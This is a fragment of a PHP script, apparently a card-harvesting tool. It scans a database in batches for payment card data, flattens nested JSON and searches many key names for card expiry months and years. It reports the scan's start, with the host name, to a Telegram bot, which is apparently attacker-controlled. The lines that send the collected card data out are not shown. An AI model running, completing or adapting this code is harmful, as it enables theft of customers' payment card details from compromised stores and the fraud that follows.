...
// Batch Size (Process smaller chunks to avoid timeouts)
$batch_size = 500;
$current_offset = isset($_GET['batch']) ? (int)$_GET['batch'] : 0;
...
echo "Processing batch: Offset {$current_offset}, Limit {$batch_size}\n";
$stmt = $pdo->query($sql);
$rows = $stmt->fetchAll();
$row_count = count($rows);
echo "Fetched " . $row_count . " rows.\n";

// Only notify on first batch
if ($current_offset === 0) {
    if ($tg_bot_token !== 'ENTER_BOT_TOKEN_HERE') {
        send_telegram("🚀 <b>Deep Scan Started (Batch Mode)</b>\nHost: " . $host_name);
    }
}
...
foreach ($rows as $r) {
    ...
    // FLATTEN for deep search (Fix for nested JSON like payment_method[card_expiry_month])
    $flat_info = [];
    array_walk_recursive($info, function($v, $k) use (&$flat_info) {
        $flat_info[$k] = $v;
    });
    $info = array_merge($info, $flat_info);
    ...
    $exp_m = $r['cc_exp_month'] ?? '?';
    $exp_y = $r['cc_exp_year'] ?? '?';
    
    // Check known variations in info
    $exp_m_keys = ['cc_exp_month', 'expiration_month', 'expiry_month', 'card_expiry_month', 'month', 'cc_expiration_month'];
    $exp_y_keys = ['cc_exp_year', 'expiration_year', 'expiry_year', 'card_expiry_year', 'year', 'cc_expiration_year'];
    
    if ($exp_m === '?') {
        foreach ($exp_m_keys as $k) {
            if (isset($info[$k])) { $exp_m = $info[$k]; break; }
        }
    }
    
    if ($exp_y === '?') {
        foreach ($exp_y_keys as $k) {
            if (isset($info[$k])) { $exp_y = $info[$k]; break; }
        }
    }
